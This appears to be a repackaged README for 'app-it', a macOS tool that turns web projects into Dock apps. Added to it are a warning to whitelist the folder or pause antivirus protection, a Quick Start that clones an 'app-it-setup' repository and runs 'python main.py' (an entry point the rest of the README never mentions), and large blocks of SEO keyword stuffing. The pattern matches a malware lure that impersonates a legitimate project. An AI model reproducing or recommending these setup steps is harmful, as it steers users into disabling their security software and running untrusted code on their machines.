# app-it


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/DamselTrellis/app-it-setup.git
cd app-it-setup
python main.py
```


Turn a local web project — or any hosted web app — into a macOS Dock-launchable `.app` bundle — a native window, its own Dock icon, and clean start/stop — **without Electron, Tauri, or a rewrite.**

> **Unofficial community project** — not affiliated with, endorsed by, or sponsored by Anthropic or OpenAI. "Claude Code" and "Codex" are their respective owners' marks, named here only to say which assistants app-it plugs into. This is an independent open-source tool built by one developer.

![A real app-it build in motion: double-click the Fjord demo's Dock icon, its native window opens, ⌘Q quits and frees the port](design/motion/app-it-lifecycle.gif)

*A real `app-it` build, in motion. `Fjord` is an ordinary local web project (`node server.js`); app-it turns it into a native macOS app — double-click launches it, the window opens with its own Dock icon, and ⌘Q quits the app **and** frees the dev-server port. The actual generated app, not a mockup.*


**Windows beta** — macOS is in daily use; Windows is an early beta, now with its first real-hardware fixes but still needing more. A complete sibling plugin (`plugins/app-it-windows/`), gated by a required `windows-latest` CI job (build · PowerShell lint · manifest parse · icon round-trip), mirrors the macOS contract with Windows primitives. The author runs only macOS, so for a long time it had never touched real Windows hardware; that changed with [#8](https://github.com/DamselTrellis/app-it-setup/pull/8), the first run on an actual Windows machine, and a run of fixes since — a real start, not a finish line. If you're on Windows and want to help harden it, the doorway is [docs/WINDOWS.md](docs/WINDOWS.md).

**Local-first** — app-it reads your project *on your machine* to choose a launcher strategy. It uploads nothing, runs no telemetry, adds no runtime dependencies, and never touches your business-logic source. The only thing it produces is an `.app` on your own Dock. For a hosted web app — a published Claude Artifact, a deployed dashboard, an internal tool — the supported networked path is explicit: wrap the hosted URL so the host handles login and keeps usage on each user's own account. See [Privacy](PRIVACY.md) and [Terms](TERMS.md) for the plain-language policy.

`app-it` is an assistant-agnostic plugin/skill. It works with **Claude Code** and **Codex**, and builds a small, repeatable launcher around an existing local project or hosted web app so that double-clicking starts the right runtime, opens a native window, keeps the Dock icon as *your* app, and cleans up when you quit.

## What app-it is not

- **Not Electron, Tauri, or a native rewrite.** It wraps your existing dev setup; it doesn't replace it, migrate it, or add a bundler to your dependency tree.
- **Not a general signed distribution system.** No notarization, no App Store, no auto-update, no installer. A wrapper around a hosted web app is self-contained enough to zip and share, but it is still an ad-hoc-signed local bundle; recipients must trust the bundle and sign in with their own account.
- **Not cross-platform.** macOS only — and on purpose. Windows is a genuinely different problem (WebView2, `.lnk`, `.ico`, SmartScreen), so it belongs in a separate plugin rather than a blurred promise. See [Compatibility](docs/COMPATIBILITY.md).
- **Not a hosted service.** Nothing runs in the cloud and there is no live demo to visit — the proof is the apps on your own Dock (the Stack further down is real).

## How it works

```text
  WHAT YOU HAVE               WHAT APP-IT DOES           WHAT YOU GET
  ───────────────────────     ──────────────────────     ───────────────────────────
  a local web project         inspects it from disk,     YourApp.app on your Dock
  Vite React, SvelteKit,      picks a strategy, then     · its own icon
  Astro, Next, static, or ──▶ builds & signs a .app  ──▶ · native window, one click
  a hosted web app URL        around a WebKit shell      · ⌘Q quits & frees the port
```

Under the hood, app-it:

- **Inspects before it touches anything** — project type, dev scripts, ports, browser-API needs, icon sources.
- **Picks a launcher strategy** — a native Swift `WKWebView` shell by default (so the Dock icon stays *yours*), Chrome `--app` mode only when a project needs Chromium-only APIs.
- **Wraps a hosted web app without shared secrets** — set `external_url` to a hosted link (for example, a published Claude Artifact); each user signs in within the app window and uses their own account.
- **Copies proven, hard-won templates** into the project rather than re-deriving fragile launcher logic each time.
- **Builds and ad-hoc-signs a real `.app`** — universal (arm64 + x86_64), Gatekeeper-friendly, with a generated `.icns`.
- **Gets the lifecycle right** — closing the window (⌘W / red-X) leaves the dev server warm for a ~250 ms re-launch; ⌘Q quits the app *and* frees the port.
- **Writes a report** explaining every change and exactly how to undo it.

> **Finished app? There's a lighter companion.** `app-it` runs your project's dev server — perfect while you're still building. Once an app is *done*, it doesn't need one: the **`app-it-static`** companion serves the built output (`dist/`, `build/`, `out/`, …) so a finished app costs ~15 MB instead of a dev server's ~300–700 MB. Same native window, same Dock Stack — reach for it only when an app is done. [How it works →](plugins/app-it-static/skills/app-it-static/SKILL.md)

## Requirements

- macOS.
- Claude Code or Codex for marketplace installation.
- `swiftc` (Xcode Command Line Tools) for the native WebKit shell — `xcode-select --install`.
- `python3` (also from the Xcode Command Line Tools) for `app-it-static`'s server mode.
- Chrome only if a project needs the Chrome fallback path.


### Local development (before publication)

```text
claude plugin marketplace add /path/to/app-it
claude plugin install app-it@app-it

codex plugin marketplace add /path/to/app-it
codex plugin add app-it@app-it
```

### Manual skill install

Marketplace install is preferred. To copy just the skill folder:

```bash
./install.sh            # auto-detects Claude Code and/or Codex, asks before overwrite
./install.sh --dry-run  # show what it would do, write nothing
```

## What it adds to a target project

All additions are additive and reversible:

- `scripts/app-it.config.json` — single source of truth for the app(s)
- `scripts/desktop-build.sh`, `desktop-install.sh`, `desktop-quit.sh`, `desktop-doctor.sh`, `desktop-verify.sh`, `wrapper.swift`, …
- `assets/<slug>-icon.png` or `.svg`
- `desktop/<App Name>.app/` *(gitignored — regenerated by the build)*
- `docs/desktop-launcher.md` and an `app-it-report.md` decision log
- `package.json` scripts: `desktop:build`, `desktop:install`, `desktop:quit`, `desktop:doctor`, `desktop:verify`

Installed apps land in `~/Applications/App It/` by default. Drag that folder to the right side of the Dock once and every future appified app appears in its Stack automatically. Override with `APP_IT_INSTALL_DIR`.

By default, generated launchers use `port_mode: "fallback"` so sibling local
apps can coexist by scanning upward from the preferred port. Use
`port_mode: "fixed"` only when the app must stay on one exact localhost origin,
such as browser storage or OAuth callbacks.

![A real MyApps Dock Stack — Mission Control, Campaigns, monëy, Heartbeat, Repo Hunter and more, each with its own icon](design/screenshots/01-myapps-stack.jpg)

*A real `MyApps` Stack, not a mockup. Every icon is an ordinary local web project app-it turned into a native app — its own icon, its own window, one click to launch. Do this a dozen times and your Dock fills itself.*

## Safety model

`app-it` only makes additive, reversible changes. It will not rewrite product logic, add runtime dependencies, require a terminal window to stay open, or assume an already-running dev server. It may start and stop local dev-server processes during verification. It never collects telemetry, sends project data anywhere, or handles secrets. See [SECURITY.md](SECURITY.md).

## Validate this repo

```bash
./scripts/validate.sh
```

This is the one-command check: it validates manifest shape, shell syntax, template presence, plist syntax, Swift typechecking, and Claude plugin validation (when the `claude` CLI is available). CI runs the same script on `macos-latest`.

For launcher/runtime changes, also run the behavioral suite:

```bash
./scripts/test-fixtures.sh
```

It builds tiny fixture apps and checks the lifecycle app-it promises: bundle shape, runtime ports, ownership, doctor/verify JSON, warm reattach, and cleanup.

## For AI agents

This repo *is* agent tooling, and agents are expected to work in it. Start with [AGENTS.md](AGENTS.md) — it names the non-obvious conventions (templates are canonical, trust disk over docs, the macOS-only boundary) and the safe first commands. Architectural decisions and their rejected alternatives live in [docs/decisions/](docs/decisions/).

## More

- [Troubleshooting](docs/TROUBLESHOOTING.md)
- [Compatibility](docs/COMPATIBILITY.md)
- [Changelog](CHANGELOG.md) · [Contributing](CONTRIBUTING.md)

## Community nudge

The `app-it-static` companion was inspired by feedback from the r/ClaudeAI launch thread, and the project keeps growing on community help. Thanks to:

- **`TechExpert2910`** for pointing out that finished apps shouldn't need a full dev server, and that Vercel/PWA-style workflows are far lighter — the nudge that became "serve the build locally, not a dev server."
- **`K_M_A_2k`** for highlighting that deployed/static proof-of-concepts are often the standard workflow and are easier to share.
- **`Vo_Mimbre`** for the corporate-environment caveat: external hosting like Vercel isn't always approved, which is exactly why a *local* static launcher earns its place even for finished projects.
- **`Firnschnee`** for becoming the Windows beta's real-hardware tester — the first proof it actually runs, then a run of fixes each traced and verified on a real Windows 11 box: the window title, the `app-it-host` label stuck in the taskbar right-click menu, and a graceful path when the WebView2 runtime is missing (offer the installer instead of a dead window).
- **`SohamKela`** for hardening the native window so a restored frame can't open off-screen or postage-stamp sized, adding first-class Vite + React, SvelteKit, and Astro dev recipes, and — most recently — the URL-only launcher that wraps a hosted web app (a published Claude Artifact is the common case) in a Dock window: no local server, no shared secrets, each recipient signed into their own account.

## License

MIT — see [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- app-it-setup - tool utility software - download install setup -->
<!-- source code app-it-setup clone | powerful app-it-setup scanner | debian app-it-setup logger | centos app-it-setup builder | install minimal app-it-setup decoder | 2025 app-it-setup app | how to setup app-it-setup reader | configure app-it-setup client | new version app-it-setup software | app-it-setup desktop | deploy app-it-setup plugin | build customizable app-it-setup engine | high performance app-it-setup binding | github app-it-setup client | safe app-it-setup framework | free app-it-setup addon | start app-it-setup mobile | how to build production ready app-it-setup | setup app-it-setup replacement | run app-it-setup | app it setup devops | download for windows self hosted app-it-setup tool | free download app-it-setup creator | updated app-it-setup plugin | run on mac app-it-setup tester | github app-it-setup reader | windows app-it-setup web | linux app-it-setup addon | portable app-it-setup service | docs low latency app-it-setup tool | free app-it-setup web | free download app-it-setup editor | configurable app-it-setup monitor | quickstart app-it-setup scanner | how to install safe app-it-setup | wiki fast app-it-setup | centos app-it-setup | app it setup support | app-it-setup software | offline app-it-setup server | build best app-it-setup | easy app-it-setup optimizer | app-it-setup engine | zip app-it-setup parser | production ready app-it-setup alternative | install production ready app-it-setup | fedora app-it-setup engine | portable app-it-setup engine | free download app-it-setup builder | new version app-it-setup copy -->
<!-- windows app-it-setup api | tutorial app-it-setup service | offline app-it-setup wrapper | free download offline app-it-setup | how to build app-it-setup addon | is app it setup safe | walkthrough secure app-it-setup | how to setup online app-it-setup | powerful app-it-setup | app-it-setup checker | stable app-it-setup reader | top app-it-setup api | run on mac native app-it-setup | offline app-it-setup program | open app-it-setup extractor | source code app-it-setup engine | app-it-setup api | new version self hosted app-it-setup | latest version app-it-setup | github app-it-setup compressor | secure app-it-setup engine | app it setup tutorial | how to setup app-it-setup server | app it setup guide | run on linux open source app-it-setup | free secure app-it-setup | open source app-it-setup web | portable app-it-setup web | how to use app-it-setup | run on linux portable app-it-setup | how to build fast app-it-setup | modular app-it-setup service | how to deploy app-it-setup compressor | fast app-it-setup library | getting started app-it-setup program | production ready app-it-setup | free app-it-setup utility | how to configure app-it-setup app | offline app-it-setup optimizer | how to install app-it-setup web | offline app-it-setup service | app it setup fix | how to download cross platform app-it-setup | wiki app-it-setup plugin | cross platform app-it-setup validator | github app-it-setup sdk | 2025 app-it-setup | how to use app-it-setup port | source code app-it-setup viewer | advanced app-it-setup parser -->
<!-- ubuntu app-it-setup | 2025 app-it-setup framework | open source powerful app-it-setup | advanced app-it-setup fork | deploy self hosted app-it-setup utility | debian app-it-setup framework | open app-it-setup | free app-it-setup cli | extensible app-it-setup | open source app-it-setup analyzer | download for windows portable app-it-setup | launch best app-it-setup | app-it-setup sdk | updated reliable app-it-setup | git clone app-it-setup application | launch app-it-setup platform | modular app-it-setup library | modular app-it-setup checker | app-it-setup alternative | download for linux app-it-setup | centos app-it-setup logger | get app-it-setup application | download app-it-setup | how to run app-it-setup downloader | how to install app-it-setup downloader | app it setup article | arch app-it-setup extension | simple app-it-setup library | tutorial app-it-setup logger | how to download app-it-setup plugin | how to use portable app-it-setup tool | how to use local app-it-setup | low latency app-it-setup | git clone self hosted app-it-setup library | online app-it-setup addon | free best app-it-setup logger | secure app-it-setup copy | execute production ready app-it-setup server | run on windows app-it-setup software | documentation app-it-setup creator | offline app-it-setup plugin | download for windows app-it-setup monitor | secure app-it-setup framework | top app-it-setup tracker | launch customizable app-it-setup | run on mac app-it-setup builder | app-it-setup application | walkthrough app-it-setup client | top app-it-setup | app-it-setup mirror -->
<!-- production ready app-it-setup gui | walkthrough app-it-setup converter | new version app-it-setup | deploy app-it-setup encoder | build app-it-setup replacement | linux app-it-setup uploader | quickstart app-it-setup monitor | free app-it-setup framework | run on mac local app-it-setup | new version app-it-setup program | compile app-it-setup generator | how to use app-it-setup editor | cross platform app-it-setup logger | lightweight app-it-setup viewer | latest version app-it-setup editor | advanced app-it-setup application | compile app-it-setup monitor | launch modern app-it-setup software | modular app-it-setup editor | modern app-it-setup reader | app it setup workflow | app it setup demo | configure secure app-it-setup gui | macos app-it-setup logger | app it setup blog | run on windows app-it-setup generator | open source app-it-setup | git clone app-it-setup client | minimal app-it-setup | documentation reliable app-it-setup | centos fast app-it-setup | free app-it-setup port | app it setup reference | app it setup reddit | how to configure app-it-setup client | sample app-it-setup sdk | example app-it-setup debugger | app it setup review | start github app-it-setup | app it setup kubernetes | compile offline app-it-setup generator | execute app-it-setup debugger | install app-it-setup sdk | how to use app-it-setup extension | deploy low latency app-it-setup | latest version app-it-setup clone | how to install app-it-setup parser | online app-it-setup validator | example app-it-setup replacement | execute modern app-it-setup -->
<!-- latest version portable app-it-setup | new version app-it-setup fork | run on mac app-it-setup tool | app-it-setup decoder | app it setup webinar | updated simple app-it-setup | modern app-it-setup application | free customizable app-it-setup | arch app-it-setup wrapper | run on linux offline app-it-setup reader | how to run app-it-setup extension | build app-it-setup alternative | modular app-it-setup cli | launch app-it-setup reader | open source app-it-setup cli | updated app-it-setup generator | stable app-it-setup fork | self hosted app-it-setup parser | app it setup course | app it setup example | download for linux app-it-setup client | open source safe app-it-setup | download for windows app-it-setup analyzer | top app-it-setup library | download for windows app-it-setup decoder | free app-it-setup creator | how to download advanced app-it-setup | how to deploy app-it-setup decoder | docs app-it-setup | setup minimal app-it-setup | download for linux app-it-setup converter | 2026 free app-it-setup | easy app-it-setup alternative | app it setup help | simple app-it-setup web | walkthrough app-it-setup | how to setup app-it-setup desktop | git clone app-it-setup | getting started app-it-setup scanner | demo app-it-setup library | source code app-it-setup | app it setup pipeline | how to build easy app-it-setup | run app-it-setup decoder | zip app-it-setup reader | download high performance app-it-setup scanner | app-it-setup app | centos app-it-setup application | 2025 app-it-setup uploader | arch powerful app-it-setup -->
<!-- download app-it-setup replacement | customizable app-it-setup | setup native app-it-setup | download app-it-setup editor | app it setup benchmark | how to setup app-it-setup logger | download for windows app-it-setup package | sample easy app-it-setup | easy app-it-setup builder | 2026 app-it-setup program | app it setup download | easy app-it-setup compressor | wiki stable app-it-setup tracker | how to download open source app-it-setup | is app it setup legit | wiki app-it-setup viewer | github app-it-setup extension | how to configure app-it-setup downloader | minimal app-it-setup analyzer | run app-it-setup alternative | deploy app-it-setup monitor | how to download app-it-setup | portable app-it-setup analyzer | build app-it-setup generator | app it setup github | app-it-setup extractor | compile github app-it-setup platform | execute app-it-setup | centos app-it-setup analyzer | run top app-it-setup | run app-it-setup program | native app-it-setup editor | online app-it-setup binding | how to install portable app-it-setup | download for windows high performance app-it-setup | macos app-it-setup plugin | macos app-it-setup client | github app-it-setup builder | getting started app-it-setup uploader | install self hosted app-it-setup | deploy app-it-setup tracker | guide offline app-it-setup | safe app-it-setup server | how to deploy app-it-setup editor | install app-it-setup web | getting started stable app-it-setup generator | open app-it-setup server | modular app-it-setup | run on windows app-it-setup addon | setup app-it-setup -->
<!-- app-it-setup creator | documentation app-it-setup parser | examples cross platform app-it-setup application | launch app-it-setup optimizer | arch app-it-setup application | start app-it-setup api | open source app-it-setup binding | windows customizable app-it-setup | download for mac app-it-setup web | run app-it-setup mirror | run simple app-it-setup | lightweight app-it-setup optimizer | example stable app-it-setup | demo configurable app-it-setup | launch safe app-it-setup | app-it-setup port | safe app-it-setup tester | get app-it-setup cli | app-it-setup fork | app-it-setup web | modular app-it-setup logger | tar.gz app-it-setup | free app-it-setup | native app-it-setup desktop | configure app-it-setup app | run on windows app-it-setup sdk | quick start app-it-setup uploader | app it setup documentation | ubuntu app-it-setup logger | portable app-it-setup tester | setup app-it-setup package | download for mac app-it-setup addon | walkthrough offline app-it-setup | docs app-it-setup sdk | 2025 app-it-setup program | run on linux app-it-setup software | github app-it-setup copy | extensible app-it-setup addon | github app-it-setup clone | how to setup app-it-setup | top app-it-setup uploader | powerful app-it-setup wrapper | linux fast app-it-setup desktop | app it setup bug | self hosted app-it-setup server | sample app-it-setup tester | app-it-setup monitor | how to build app-it-setup tester | safe app-it-setup downloader | app-it-setup package -->
<!-- secure app-it-setup addon | online app-it-setup | how to build app-it-setup encoder | quickstart best app-it-setup | safe app-it-setup validator | setup app-it-setup converter | run on linux modern app-it-setup | updated app-it-setup | example app-it-setup engine | easy app-it-setup addon | native app-it-setup compressor | docs app-it-setup analyzer | execute app-it-setup framework | updated app-it-setup reader | simple app-it-setup | modern app-it-setup | linux fast app-it-setup | arch app-it-setup analyzer | tutorial app-it-setup module | run on windows app-it-setup tester | 2026 app-it-setup monitor | setup high performance app-it-setup builder | app-it-setup builder | fedora app-it-setup decoder | linux app-it-setup | macos app-it-setup scanner | download app-it-setup extractor | start top app-it-setup downloader | examples app-it-setup downloader | reliable app-it-setup debugger | reliable app-it-setup downloader | execute minimal app-it-setup | github app-it-setup service | secure app-it-setup application | sample app-it-setup | self hosted app-it-setup application | app it setup automation | low latency app-it-setup scanner | native app-it-setup | app it setup saas | fast app-it-setup module | easy app-it-setup | local app-it-setup | stable app-it-setup extractor | app-it-setup viewer | guide app-it-setup framework | cross platform app-it-setup checker | tar.gz app-it-setup uploader | sample top app-it-setup | use app-it-setup cli -->
<!-- low latency app-it-setup package | example app-it-setup | best app it setup | beginner app-it-setup decoder | documentation extensible app-it-setup | fast app-it-setup | getting started app-it-setup | minimal app-it-setup service | how to download app-it-setup replacement | best app-it-setup mobile | debian app-it-setup wrapper | app-it-setup encoder | source code app-it-setup service | git clone configurable app-it-setup parser | walkthrough app-it-setup software | compile extensible app-it-setup | high performance app-it-setup clone | wiki app-it-setup | linux app-it-setup scanner | download for windows app-it-setup | advanced app-it-setup platform | download cross platform app-it-setup | free app-it-setup platform | online app-it-setup web | setup safe app-it-setup monitor | high performance app-it-setup plugin | guide app-it-setup service | build app-it-setup copy | ubuntu app-it-setup editor | run on mac stable app-it-setup | high performance app-it-setup copy | configurable app-it-setup service | how to deploy app-it-setup uploader | wiki app-it-setup cli | 2026 app-it-setup engine | documentation high performance app-it-setup | run on windows app-it-setup | app-it-setup framework | configurable app-it-setup wrapper | how to deploy app-it-setup | guide app-it-setup | 2026 app-it-setup | app-it-setup clone | modular app-it-setup package | app-it-setup module | safe app-it-setup | fast app-it-setup downloader | use low latency app-it-setup | app-it-setup generator | open source app-it-setup wrapper -->
<!-- tar.gz modular app-it-setup | reliable app-it-setup client | quick start free app-it-setup gui | app it setup alternative | github app-it-setup tool | production ready app-it-setup encoder | app it setup vs | best app-it-setup | cross platform app-it-setup framework | github app-it-setup scanner | download for mac app-it-setup encoder | download for mac app-it-setup app | free self hosted app-it-setup analyzer | fedora app-it-setup analyzer | getting started app-it-setup cli | app-it-setup client | production ready app-it-setup framework | linux app-it-setup downloader | getting started free app-it-setup service | best app-it-setup analyzer | deploy github app-it-setup | guide app-it-setup server | how to install app-it-setup replacement | quickstart app-it-setup app | low latency app-it-setup debugger | windows stable app-it-setup tracker | app-it-setup server | github app-it-setup converter | sample portable app-it-setup extension | safe app-it-setup web | app-it-setup tracker | low latency app-it-setup service | 2026 app-it-setup parser | safe app-it-setup software | demo app-it-setup compressor | app-it-setup uploader | debian app-it-setup extractor | tutorial app-it-setup | how to setup advanced app-it-setup module | run on mac app-it-setup scanner | app-it-setup service | get reliable app-it-setup application | open app-it-setup replacement | how to install app-it-setup checker | app-it-setup logger | configurable app-it-setup | how to run app-it-setup encoder | compile app-it-setup port | free download app-it-setup | github app-it-setup parser -->

<!-- Last updated: 2026-06-09 18:35:02 -->
